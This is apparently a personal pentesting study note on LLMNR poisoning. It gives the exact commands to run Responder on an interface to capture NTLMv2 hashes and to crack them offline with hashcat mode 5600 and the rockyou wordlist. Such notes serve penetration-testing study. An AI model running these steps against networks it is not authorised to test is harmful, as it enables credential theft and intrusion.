**LLMNR**
- Step 1: Run responder
    
    - sudo responder -I tun0 -dP
        
        - run with -v if a hash has already been captured before
        
    
- Step 2: Event Occurs
    
    - like putting your IP address into the file system
    
![[/Untitled 13.png|Untitled 13.png]]
- Step 3: Get the hashes
    
    - responder will return the NTLMv2 hash
    
- Step 4: Crack the hash
    
    - hashcat -m 5600 hashes.txt rockyou.txt
        
        - 5600 is NTMLv2